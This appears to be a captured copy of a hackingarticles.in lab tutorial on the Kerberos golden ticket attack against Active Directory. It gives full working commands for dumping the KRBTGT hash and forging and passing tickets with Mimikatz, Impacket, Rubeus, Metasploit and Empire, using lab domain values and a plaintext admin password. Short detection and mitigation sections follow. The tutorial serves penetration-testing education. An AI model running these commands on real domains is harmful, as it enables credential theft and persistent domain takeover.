@@ -1,0 +1,198 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/persistence/" rel="category tag">Persistence</a></span>            </div>
+            <h1 class="post-title entry-title">Domain Persistence: Golden Ticket Attack</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/domain-persistence-golden-ticket-attack/" rel="bookmark"><time class="entry-date published" datetime="2020-04-24T14:30:54+00:00">April 24, 2020</time><time class="updated" datetime="2025-05-30T08:09:42+00:00">May 30, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p class="ai-optimize-6 ai-optimize-introduction"><span style="color: #000000;">In this article, we have used the Golden Ticket attack for Domain Persistence. Golden Ticket Attack is a famous technique of impersonating users on an AD domain by abusing Kerberos authentication. As we all know, Windows’ two famous authentication protocols are NTLM and Kerberos. In this article, you will learn why this is known as persistence and how an attacker can exploit the weakness of AD.</span></p>
+<h3 class="ai-optimize-7"><span style="color: #800000;">Table of Content</span></h3>
+<ul>
+<li class="ai-optimize-8"><strong><span style="color: #000000;">AD Default Local Account</span></strong></li>
+<li class="ai-optimize-9"><strong><span style="color: #000000;">Kerberos Authentication Process</span></strong></li>
+<li class="ai-optimize-10"><strong><span style="color: #000000;">Forging Kerberos Tickets</span></strong></li>
+<li class="ai-optimize-11"><strong><span style="color: #000000;">Golden Ticket Attack</span></strong></li>
+<li class="ai-optimize-12"><strong><span style="color: #000000;">Golden Ticket Attack Walkthrough</span></strong>
+<ul>
+<li class="ai-optimize-13"><span style="color: #000000;">Mimikatz</span></li>
+<li class="ai-optimize-14"><span style="color: #000000;">Impacket</span></li>
+<li class="ai-optimize-15"><span style="color: #000000;">Rubeus.exe</span></li>
+<li class="ai-optimize-16"><span style="color: #000000;">Metasploit</span></li>
+<li class="ai-optimize-17"><span style="color: #000000;">Empire</span></li>
+</ul>
+</li>
+<li class="ai-optimize-18"><strong><span style="color: #000000;">Hunting Event log Golden ticket</span></strong></li>
+<li class="ai-optimize-19"><strong><span style="color: #000000;">Mitigation</span></strong></li>
+</ul>
+<h3 class="ai-optimize-20"><span style="color: #800000;">AD Default Local Account</span></h3>
+<p class="ai-optimize-21"><span style="color: #000000;">Default local accounts are built-in accounts that are created automatically when a Windows Server domain controller is installed, and the domain is created. These default local accounts have counterparts in Active Directory</span></p>
+<p class="ai-optimize-22"><span style="color: #000000;">The default local accounts in the Users container include: Administrator, Guest, and KRBTGT. The HelpAssistant account is installed when a Remote Assistance session is established. The following sections describe the default local accounts and their use in Active Directory.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-RKDVKZlhPrM/XqLvcMIMgHI/AAAAAAAAjs4/rErUlbsHXtsPx4zy92DTLd7Q2jGQHSMeACLcBGAsYHQ/s1600/0.0.png"/></p>
+<p><img fetchpriority="high" decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-49680WZcbdg/XqLvcc-5vBI/AAAAAAAAjtA/YZyf9I3JVHc4tPSy_JvLSeOaVrTrU4T4wCLcBGAsYHQ/s1600/0.1.png" alt="Golden Ticket attack for Domain Persistence" width="739" height="639"/></p>
+<h3 class="ai-optimize-23"><span style="color: #800000;">Kerberos Authentication Process</span></h3>
+<p class="ai-optimize-24"><span style="color: #000000;">In the Active Directory domain, every domain controller runs a KDC (Kerberos Distribution Center) service that processes all requests for tickets to Kerberos. For Kerberos tickets, AD uses the KRBTGT account in the AD domain. KRBTGT is also the security principal name used by the KDC for a Windows Server domain</span></p>
+<ul>
+<li class="ai-optimize-25"><span style="color: #000000;"><strong>Legitimate User:</strong> Begins the communication for a service request.</span></li>
+<li class="ai-optimize-26"><span style="color: #000000;"><strong>Application Server:</strong> The server with the service the user wants to access.</span></li>
+<li class="ai-optimize-27"><span style="color: #000000;"><strong>Key Distribution Center (KDC):</strong> KBRTGT account acts as a service account for the Key Distribution Center (KDC) and separated into three parts: Database (db), Authentication Server (AS) and Ticket Granting Server (TGS).</span></li>
+<li class="ai-optimize-28"><span style="color: #000000;"><strong>Authentication Server (AS):</strong> Verify client authentication. If the logged user is authenticated successfully the AS issues a ticket called TGT.</span></li>
+<li class="ai-optimize-29"><span style="color: #000000;"><strong>Ticket Granting Ticket (TGT):</strong> confirms to other servers that user has been authenticated.</span></li>
+<li class="ai-optimize-30"><span style="color: #000000;"><strong>Ticket Granting Server (TGS):</strong> User request for TGS from the KDC that will be used to access the service of the application server.</span></li>
+</ul>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-QMu_dv-Ggkk/XqLvcSBDAxI/AAAAAAAAjs8/1E8gNckB9yMFBeVnBO3MW3vuMlz-IlHxwCLcBGAsYHQ/s1600/0.2.png"/></p>
+<h3 class="ai-optimize-31"><span style="color: #800000;">Forging Kerberos Tickets</span></h3>
+<p class="ai-optimize-32"><span style="color: #000000;">Forging Kerberos tickets depends on the password hash available to the attacker</span></p>
+<ul>
+<li class="ai-optimize-33"><span style="color: #000000;">Golden Tickets requires the KRBTGT password hash.</span></li>
+<li class="ai-optimize-34"><span style="color: #000000;">Silver ticket requires the Service Account (either the computer account or user account) password hash.</span></li>
+</ul>
+<h3 class="ai-optimize-35"><span style="color: #800000;">Golden Ticket Attack</span></h3>
+<p class="ai-optimize-36"><span style="color: #000000;">Golden Tickets are forged Ticket-Granting Tickets (TGTs), also known as authentication tickets. As shown in the following image, attackers bypass the first and second stages and directly initiate communication with the Key Distribution Center (KDC) from the third stage. Since a Golden Ticket is a forged TGT, attackers send it to the Domain Controller as part of the TGS-REQ to obtain a service ticket.</span></p>
+<p class="ai-optimize-37"><span style="color: #000000;">Additionally, the TGT primarily informs the KDC’s domain controller that another domain controller has authenticated the users. However, in reality, the TGT contains the KRBTGT account’s password hash, which is encrypted. Any KDC service within the domain can decrypt this hash, thereby proving the ticket’s validity.</span></p>
+<h5 class="ai-optimize-38"><strong><span style="color: #000000;">The requirements for forging TGT:</span></strong></h5>
+<ul>
+<li class="ai-optimize-39"><span style="color: #000000;">Domain Name</span></li>
+<li class="ai-optimize-40"><span style="color: #000000;">SID</span></li>
+<li class="ai-optimize-41"><span style="color: #000000;">Domain KRBTGT Account NTLM password hash</span></li>
+<li class="ai-optimize-42"><span style="color: #000000;">Impersonate user</span></li>
+</ul>
+<p><img decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-zOs2UBFgRfY/XqLvdASzEBI/AAAAAAAAjtE/4ZvQV-aw1mUQ3UmOeDOlRikBVHdbLojDwCLcBGAsYHQ/s1600/0.3.png" alt="Golden Ticket attack for Domain Persistence" width="658" height="549"/></p>
+<p class="ai-optimize-43"><span style="color: #000000;">If an intruder has access to an Active Directory forest/domain administrator/local administrator account, he/she can exploit Kerberos tickets for identity theft. A golden ticket attack is something that he/ he creates a ticket created by Kerberos that is valid for 10 years. However, if any other user has changed its password, the attacker may use the KRBTGT account to stay on the network. The attacker may also create accessible user/computer/service tickets from Kerberos for a non-existent Active Directory account.</span></p>
+<h3 class="ai-optimize-44"><span style="color: #800000;">Golden Ticket Attack Walkthrough </span></h3>
+<p class="ai-optimize-45"><span style="color: #000000;">As we know, there is some basic requirement create a forge TGT i.e extract the “<strong>domain Name, SID, krbtgt Hash</strong>”, Once an attacker has admin access to a Domain Controller, the KRBTGT account password hashes can be extracted using Mimikatz.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">privilege::debug
+lsadump::lsa /inject /name:krbtgt</pre>
+<ul>
+<li class="ai-optimize-46"><span style="color: #000000;"><strong>Domain :</strong>ignite.local</span></li>
+<li class="ai-optimize-47"><span style="color: #000000;"><strong>sid</strong>: S-1-5-21-3523557010-2506964455-2614950430</span></li>
+<li class="ai-optimize-48"><span style="color: #000000;"><strong>krbtgt Hash:</strong> f3bc61e97fb14d18c42bcbf6c3a9055f</span></li>
+<li class="ai-optimize-49"><span style="color: #000000;"><strong>Impersonate User:</strong> Pavan (In My case)</span></li>
+</ul>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-F_kIcbCkgXs/XqLvdm_mnII/AAAAAAAAjtI/7FG9sYhiR5odaG0lCrd9bO5oXvAApVfAgCLcBGAsYHQ/s1600/1.png"/></p>
+<p class="ai-optimize-50"><span style="color: #000000;">Even though I have access to domain controller then also I cannot connect to the Application server using PsExce.exe as shown in the below image, now let us try this again, using forge TGT using Multiple Methods.</span></p>
+<p><img decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-YV592CyHz0w/XqLvgL-rdoI/AAAAAAAAjtk/lt6eiefw29gt5IOdZ5is1AdQTV-E3c0rQCLcBGAsYHQ/s1600/2.png" alt="Golden Ticket attack for Domain Persistence" width="603" height="321"/></p>
+<h4 class="ai-optimize-51"><span style="color: #800000;">Mimikatz: Pass the Ticket</span></h4>
+<p class="ai-optimize-52"><span style="color: #000000;">Mimikatz is available for Kerberos attack, it allows to create the forged ticket and simultaneously pass the TGT to KDC service to Get TSG and you will able to connect to Domain Server. This can be done by running both commands on cmd as administrator.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">kerberos::golden /user:pavan /domain:ignite.local /sid:S-1-5-21-3523557010-2506964455-2614950430 /krbtgt:f3bc61e97fb14d18c42bcbf6c3a9055f /id:500 /ptt
+misc::cmd</pre>
+<p class="ai-optimize-53"><span style="color: #000000;">Above command will generate the ticket for impersonating user with RID 500.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-eBxLiQDFxYc/XqLvhHRDDuI/AAAAAAAAjtw/wg2XUUVITE0pq8g090tJpD997sJyxgvVACLcBGAsYHQ/s1600/3.jpg"/></p>
+<p class="ai-optimize-54"><span style="color: #000000;">As soon as you will run above commands you (attacker) will get a new cmd prompt which will allow to connect with domain server using PsExec.exe as shown in the below image.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">PsExec64.exe \\192.168.1.105 cmd.exe
+ipconfig</pre>
+<h3><img loading="lazy" decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-0uIB4fbDuCw/XqLvhjcb0KI/AAAAAAAAjt4/QSo1AUsRSyIdxstfM3NeI8aaD9iQpfSnQCLcBGAsYHQ/s1600/4.jpg" alt="Golden Ticket attack for Domain Persistence" width="623" height="540"/></h3>
+<h4 class="ai-optimize-55"><span style="color: #000000;"><span style="color: #800000;">Mimikatz: Generate the ticket</span> </span></h4>
+<p class="ai-optimize-56"><span style="color: #000000;">If you do not want to pass the ticket but want to create the forged ticket that you can use later because the TGT is valid for 10 years, you can execute below the command that generates the ticket in the form of the ticket.kirbi file.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">kerberos::golden /user:pavan /domain:ignite.local /sid:S-1-5-21-3523557010-2506964455-2614950430 /krbtgt:f3bc61e97fb14d18c42bcbf6c3a9055f /id:500</pre>
+<p class="ai-optimize-57"><span style="color: #000000;">Above command will generate the TGT key for impersonating user with RID 500.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-1Lt8E4YT09E/XqLviSaejvI/AAAAAAAAjuA/p00xEv_PzK4_o000hz162Rp5-o-5tqmegCLcBGAsYHQ/s1600/5.jpg"/></p>
+<p class="ai-optimize-58"><span style="color: #000000;">So, whenever you want to access the Domain Server service, you can use the ticket.kirbi file. This can be done by executing the following commands:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">kerberos::ptt ticket.kirbi
+misc::cmd</pre>
+<p><img loading="lazy" decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-HUHU8m4almc/XqLvkkMEmRI/AAAAAAAAjuc/VfkpHldrTk0IbpLtBsrjfKEpyXIDFH27QCLcBGAsYHQ/s1600/6.jpg" alt="Golden Ticket attack for Domain Persistence" width="644" height="134"/></p>
+<p class="ai-optimize-59"><span style="color: #000000;">And then repeat the above steps to access the service.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">PsExec64.exe \\192.168.1.105 cmd.exe
+ipconfig</pre>
+<h3><img decoding="async" src="https://1.bp.blogspot.com/-HjwWGizAZzw/XqLvlA05R-I/AAAAAAAAjug/0obneB8_mxozINiSOX-JEL27BIaOmBGBQCLcBGAsYHQ/s1600/7.jpg"/></h3>
+<h4 class="ai-optimize-60"><span style="color: #000000;"><span style="color: #800000;">Impacket</span> </span></h4>
+<p class="ai-optimize-61"><span style="color: #000000;">Similarly, you can use<span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://github.com/SecureAuthCorp/impacket"> impacket</a> </strong></span>tool to get prerequisite for generating Forge Kerberos ticket, thus repeat the same step using the following command:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">python lookupsid.py ignite/Administrator:Ignite@987@192.168.1.105</pre>
+<p class="ai-optimize-62"><span style="color: #000000;">Here, we have used for <strong>lookupid</strong> python script to enumerate the Domain SID.</span></p>
+<p><img loading="lazy" decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-wbNZrwQVvHs/XqLvltcRLKI/AAAAAAAAjuk/zcl_9GHJSBgmaq3l5NKUqHd7NuZeW3CZgCLcBGAsYHQ/s1600/8.png" alt="Golden Ticket attack for Domain Persistence" width="795" height="342"/></p>
+<p class="ai-optimize-63"><span style="color: #000000;">After then, used <strong>secretsdump.py</strong> the python script for extracting Krbtgt hash &amp; domain name with the help of the following command:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">python secretsdump.py administrator:Ignite@987@192.168.1.105 -outputfile krb -user-status</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-qwPPkUh4rBE/XrL5DKsMc0I/AAAAAAAAj40/ywaY1Ahl8VQ4vIqtyn6Dc7rxRauZ8VQ_gCLcBGAsYHQ/s1600/99.png"/></p>
+<p class="ai-optimize-64"><span style="color: #000000;">Use<strong> ticketer.py </strong>script that will create TGT/TGS tickets from scratch or based on a template (legally requested from the KDC) allowing you to customize some of the parameters set inside the PAC_LOGON_INFO structure, in particular the groups, extrasids, etc. Tickets duration is fixed to 10 years from now.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">python ticketer.py -nthash f3bc61e97fb14d18c42bcbf6c3a9055f -domain-sid S-1-5-21-3523557010-2506964455-2614950430 -domain ignite.local raj
+export KRB5CCNAME=/root/Tools/impacket/examples/raj.ccache</pre>
+<p class="ai-optimize-65"><span style="color: #000000;">Use <strong>ticket_converter.py</strong> script which will convert kirbi files into ccache file used by impacket.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">python ticketConverter.py /root/impacket/examples/raj.ccache ticket.kirbi</pre>
+<p><img loading="lazy" decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-5sb_o-7ypM4/XrL3BWE9ZrI/AAAAAAAAj4w/3zBFiu-c0H8m9QjXEFEef7S7V9B5SQr9wCLcBGAsYHQ/s1600/100.png" alt="Golden Ticket attack for Domain Persistence" width="896" height="382"/></p>
+<p class="ai-optimize-66"><span style="color: #000000;">Again, whenever you want to access the Domain server service you can use the <strong>ticket.kirbi</strong> file. And this can be done by executing the following commands as done in the above sections:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">kerberos::ptt ticket.kirbi
+misc::cmd</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-GOMexWDCwps/XqLve5IMCUI/AAAAAAAAjtc/Y4QhVVgf_VIquZTNIvs6VJpWjPm0JWVLwCLcBGAsYHQ/s1600/12.1.jpg"/></p>
+<p class="ai-optimize-67"><span style="color: #000000;">And then repeat the above step to access the service.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">PsExec64.exe \\192.168.1.105 cmd.exe
+ipconfig</pre>
+<h3><img loading="lazy" decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-C0oicrDl0yU/Xr2iNU1r7fI/AAAAAAAAkFI/rNKqhdphscsdH6pDCcm54VfhvwCRTEZIwCLcBGAsYHQ/s1600/555.png" alt="Golden Ticket attack for Domain Persistence" width="621" height="552"/></h3>
+<h4 class="ai-optimize-68"><span style="color: #800000;">Pass The Ticket with Rubeus.exe</span></h4>
+<p class="ai-optimize-69"><span style="color: #000000;">Similarly, you can use Rubeus.exe which is an alternative option to pass the ticket, Rubeus is a C# toolset for raw Kerberos interaction and abuses. It is heavily adapted from Benjamin Delpy’s Kekeo project (CC BY-NC-SA 4.0 license) and Vincent LE TOUX’s MakeMeEnterpriseAdmin project (GPL v3.0 license). Full credit goes to Benjamin and Vincent for working out the hard components of weaponization.</span></p>
+<p class="ai-optimize-70"><span style="color: #000000;">You can download it from here: <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Rubeus.exe">https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Rubeus.exe</a></strong></span></span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">Rubeus.exe ptt /ticket:ticket.kirbi
+PsExec64.exe \\192.168.1.105 cmd.exe
+ipconfig</pre>
+<p class="ai-optimize-71"><span style="color: #000000;">Now run the use psexec64.exe on the same terminal to connect with the application server.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-9BYSysvZJC8/XrrtKYRQ-eI/AAAAAAAAj-c/M-kC2Ew7xu85L--ZZjgSIw9Ax-Axto0CQCLcBGAsYHQ/s1600/final.png"/></p>
+<h4 class="ai-optimize-72"><span style="color: #800000;">Metasploit: Kiwi</span></h4>
+<p class="ai-optimize-73"><span style="color: #000000;">The TGT/TGS can be generated remotely using Metasploit, for you need to compromise victim’s machine who is a member of AD and then follow the below steps. Use kiwi to enumerate krbtgt hash &amp; SID of the domain controller.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">load kiwi
+dcsync_ntlm krbtgt</pre>
+<p><img loading="lazy" decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-fID5CjL-4CE/XqLvhThS7EI/AAAAAAAAjt0/qKW46-9BnmAcYukBrxV8Hln1cL-3KOZvwCLcBGAsYHQ/s1600/45.png" alt="Golden Ticket attack for Domain Persistence" width="708" height="270"/></p>
+<p class="ai-optimize-74"><span style="color: #000000;">Collect the domain name and other required details of the network using the following command:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">shell
+ipconfig /all</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-RsCCJ6-yE9Y/XqLvicbhxoI/AAAAAAAAjt8/XTXSgYpwFicor3lJCFwsBwtq6UVnk8C1QCLcBGAsYHQ/s1600/46.png"/></p>
+<p class="ai-optimize-75"><span style="color: #000000;">Now, use above enumerated information to generate Ticket use module:golden_ticket_create, it will store the ticket.kirbi on the desktop of my local machine.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">golden_ticket_create -d ignite.local -u pavan -s S-1-5-21-3523557010-2506964455-2614950430 -k f3bc61e97fb14d18c42bcbf6c3a9055f -t /root/Desktop/ticket.kirbi</pre>
+<h3><img loading="lazy" decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-KVrkmPr4c-c/XqLvkGL2wVI/AAAAAAAAjuU/zE3y5FrlmHo6ehUEZ9MHDzOHDhC-rOwmQCLcBGAsYHQ/s1600/54.png" alt="Golden Ticket attack for Domain Persistence" width="1365" height="466"/></h3>
+<h4 class="ai-optimize-76"><span style="color: #800000;">Metasploit: Mimikatz Powershell Script</span></h4>
+<p class="ai-optimize-77"><span style="color: #000000;">Similarly, you can use Powershell Script of Mimikatz to generate Ticket remotely for injecting in an application server or to store in form of kirbi format for future use. Now upload mimikatz powershell script to generate TGT and for this run given commands.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">upload /root/powershell/Invoke-Mimikatz.ps1 .
+shell
+cd C:\Users\yashika\Desktop\
+powershell
+Set-ExecutionPolicy Unrestricted
+Import-Module .\Invoke-Mimikatz.ps1</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-3bXRUSpnHtg/XqLviYFvQjI/AAAAAAAAjuE/JTqiGCdZvYMjMbZhSnkLMXIz2A5rOm1kwCLcBGAsYHQ/s1600/50.png"/></p>
+<p class="ai-optimize-78"><span style="color: #000000;">When you have all required information then generate forge Ticket with the help of the following command.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">Invoke-Mimikatz -Command '"kerberos::golden /user:pavan /domain:ignite.local /sid:S-1-5-21-3523557010-2506964455-2614950430 /krbtgt:f3bc61e97fb14d18c42bcbf6c3a9055f /id:500 "'</pre>
+<p class="ai-optimize-79"><span style="color: #000000;">Above command will generate the Token for impersonating user with RID 500.</span></p>
+<p class="ai-optimize-80"><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-D7l3TtCuXnA/XqLvjYVZ7II/AAAAAAAAjuI/bqWVhePE7pULkc3Be0CVz6NWEuZ82TSYQCLcBGAsYHQ/s1600/51.png" alt="Golden Ticket attack for Domain Persistence" width="1600" height="432"/></span></p>
+<p class="ai-optimize-81"><span style="color: #000000;">Once the attacker generates forge ticket, he/she can use this ticket in future to access the service of the application server by executing the following commands.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">Invoke-Mimikatz -Command '"kerberos::purge"'
+Invoke-Mimikatz -Command '"kerberos::ptt ticket.kirbi"'
+Copy-Item C:/Users/yashika/Desktop/raj.exe -Destination \\WIN-S0V7KMTVLD2.ignite.local\c$
+dir \\WIN-S0V7KMTVLD2.ignite.local\c$</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-vD0bj1wFMZI/XqLvjkAKzGI/AAAAAAAAjuM/JXJVGWvsVI8OcR-y6lYXNuQp0PkjccWcQCLcBGAsYHQ/s1600/52.png"/></p>
+<p class="ai-optimize-82"><span style="color: #000000;">Similarly, if you want to inject Ticket at the time it is generated to access the application server within that moment, then you run the below command.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">Invoke-Mimikatz -Command '"kerberos::golden /user:pavan /domain:ignite.local /sid:S-1-5-21-3523557010-2506964455-2614950430 /krbtgt:f3bc61e97fb14d18c42bcbf6c3a9055f /id:500 /ptt"'
+dir \\WIN-S0V7KMTVLD2.ignite.local\c$</pre>
+<h3><img loading="lazy" decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-jKR6z5RRVro/XqLvjuMKYwI/AAAAAAAAjuQ/bWCgg0NvfhARe37fJd3wGIBAzjoYQFmrwCLcBGAsYHQ/s1600/53.png" alt="Golden Ticket attack for Domain Persistence" width="1441" height="607"/></h3>
+<h4 class="ai-optimize-83"><span style="color: #800000;">Powershell Empire</span></h4>
+<p class="ai-optimize-84"><span style="color: #000000;">When it comes to generating TGT/TGS. The PowerShell Empire is the most dangerous framework, because once you have compromised a victim machine that is a member of AD. Then, you can use the following module directly without an admin privilege session.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">usemodule credentials/mimikatz/golden_ticket
+set domain &lt;Domain_name&gt;
+set sid &lt;SID&gt;
+set user pavan
+set group
+set id 500
+set krbtgt_hash &lt;ntlm_hash&gt;</pre>
+<p class="ai-optimize-85"><span style="color: #000000;">This is a dynamic way to generate a ticket. Because this module can be run without having admin privileges. It will inject the ticket into the current session, the attacker can get direct access to the server.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-T0L9GdbLQSQ/XqLvkmlaVKI/AAAAAAAAjuY/f2G5rO90s_Mex2YPr2CQ10HVrSiEdjt5QCLcBGAsYHQ/s1600/56.png"/></p>
+<h3 class="ai-optimize-86"><span style="color: #800000;">Hunting Event log Golden ticket</span></h3>
+<p class="ai-optimize-87">When an attacker uses a bogus user account (one not in the AD Forest) with the RID of an existing AD account (Yashika), this creates a powerful attack.</p>
+<p class="ai-optimize-88">or. In this case, the bogus user is “pavan” and has the groups set to the standard Golden Ticket admin groups. Additionally, this activity generates an event log for the bogus user’s logon attempt. The event ID should be 4769, and it will disclose the impersonated username and machine IP.</p>
+<p class="ai-optimize-89"><span style="color: #000000;">In the normal, valid account logon events, the event data structure is:</span></p>
+<ul>
+<li class="ai-optimize-90"><span style="color: #000000;">Security ID: DOMAIN\AccountID</span></li>
+<li class="ai-optimize-91"><span style="color: #000000;">Account Name: AccountID</span></li>
+<li class="ai-optimize-92"><span style="color: #000000;">Account Domain: DOMAIN</span></li>
+</ul>
+<p><img loading="lazy" decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-tAjLlEHgy80/XqLveNdK69I/AAAAAAAAjtQ/m-N5a6IqQkMnHwr4iBE9alFSDHGkwX_8gCLcBGAsYHQ/s1600/100.png" alt="Golden Ticket attack for Domain Persistence" width="624" height="672"/></p>
+<h3 class="ai-optimize-93"><span style="color: #800000;">Mitigation </span></h3>
+<p class="ai-optimize-94"><span style="color: #000000;">Reset the krbtgt account password/keys</span></p>
+<p class="ai-optimize-95"><span style="color: #000000;">Microsoft has released the script to reset the krbtgt account password/keys which were not possible earlier. This script will help you reset the krbtgt account password and related keys. Additionally, it minimizes the likelihood of Kerberos authentication issues resulting from this operation.</span></p>
+<p class="ai-optimize-96"><span style="color: #000000;">You can download it from <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://learn.microsoft.com/en-us/answers/questions/253712/where-has-the-krbtgt-reset-script-gone">here</a></strong></span>. This script is applicable for the following platforms:</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-0cwfYIAMWeE/XqLveoeQgLI/AAAAAAAAjtU/JAJNt3r7rOsusuKahZd9xU_6IwGQnivmACLcBGAsYHQ/s1600/101.png"/></p>
+<p class="ai-optimize-97"><span style="color: #000000;">Install endpoint protection to block attackers from loading modules like Mimikatz &amp; PowerShell scripts</span></p>
+<p class="ai-optimize-98"><span style="color: #000000;">Limit privilege for Admin and Domain Administrator access.</span></p>
+<p class="ai-optimize-99"><span style="color: #000000;">Alert on known behaviours that indicate Golden Ticket or other similar attacks.</span></p>
+<p class="ai-optimize-100"><span style="color: #000000;">To learn more about Domain Persistence. Follow this <strong><a href="https://www.hackingarticles.in/tag/domain-persistence/">Link</a></strong>.</span></p>
+<h3 class="ai-optimize-101"><span style="color: #800000;">Reference: </span></h3>
+<p class="ai-optimize-102"><strong><span style="color: #0000ff;"><a style="color: #0000ff;" href="https://www.blackhat.com/docs/us-15/materials/us-15-Metcalf-Red-Vs-Blue-Modern-Active-Directory-Attacks-Detection-And-Protection-wp.pdf">https://www.blackhat.com/docs/us-15/materials/us-15-Metcalf-Red-Vs-Blue-Modern-Active-Directory-Attacks-Detection-And-Protection-wp.pdf</a></span></strong></p>
+<p class="ai-optimize-103"><strong><span style="color: #0000ff;"><a style="color: #0000ff;" href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/dn745899(v=ws.11)?redirectedfrom=MSDN#default-local-accounts-in-active-directory">https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/dn745899(v=ws.11)?redirectedfrom=MSDN#default-local-accounts-in-active-directory</a></span></strong></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
